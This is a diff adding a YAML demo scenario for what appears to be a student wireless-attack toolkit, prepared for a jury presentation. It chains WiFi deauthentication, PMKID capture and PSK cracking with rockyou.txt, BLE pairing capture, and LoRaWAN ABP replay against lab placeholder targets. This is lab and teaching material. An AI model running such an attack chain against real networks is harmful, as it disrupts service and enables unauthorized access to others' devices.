@@ -1,0 +1,89 @@
+# Full jury demo scenario
+# Showcases one attack chain per protocol in sequence.
+# Designed for the final soutenance presentation.
+#
+# Usage:
+#   srt scenario scenarios/full_demo_jury.yaml --operator "Firas"
+#
+# Duration: ~12 min total
+# Requires: full lab kit (HackRF + NIC + BLE adapter)
+
+name: full_demo_jury
+description: >
+  End-to-end demonstration for the jury: WiFi PSK crack, BLE pairing
+  exploitation, and LoRaWAN replay.
+
+variables:
+  target_bssid: "AA:BB:CC:DD:EE:01"
+  target_ble_mac: "DE:AD:BE:EF:00:01"
+  target_devaddr: "26011BDA"
+  target_channel: 6
+  wifi_channels: "1,6,11"
+  lora_band: eu868
+  lora_freq_hz: 868100000
+  lora_sf: 7
+
+options:
+  bail_on_fail: false
+  report_format:
+    - json
+    - markdown
+    - pdf
+
+steps:
+  # --- WiFi segment ---
+  - id: wifi_recon
+    module: wifi.recon
+    params:
+      duration_s: 15
+      channels: "{{wifi_channels}}"
+
+  - id: wifi_deauth
+    module: wifi.deauth
+    params:
+      bssid: "{{target_bssid}}"
+      count: 10
+      channel: "{{target_channel}}"
+
+  - id: wifi_pmkid
+    module: wifi.pmkid
+    params:
+      bssid: "{{target_bssid}}"
+      timeout_s: 20
+
+  - id: wifi_crack
+    module: wifi.psk_crack
+    params:
+      hash_file: "data/captures/hash.22000"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
+
+  # --- BLE segment ---
+  - id: ble_recon
+    module: ble.recon
+    params:
+      duration_s: 10
+
+  - id: ble_gatt_enum
+    module: ble.gatt_enum
+    params:
+      target_mac: "{{target_ble_mac}}"
+
+  - id: ble_pair_capture
+    module: ble.pair_capture
+    params:
+      target_mac: "{{target_ble_mac}}"
+
+  # --- LoRaWAN segment ---
+  - id: lora_recon
+    module: lora.recon
+    params:
+      duration_s: 60
+      band: "{{lora_band}}"
+
+  - id: lora_replay
+    module: lora.uplink_replay_abp
+    params:
+      devaddr: "{{target_devaddr}}"
+      freq_hz: "{{lora_freq_hz}}"
+      sf: "{{lora_sf}}"
+      capture_file: "data/captures/lora_abp_capture.cfile"
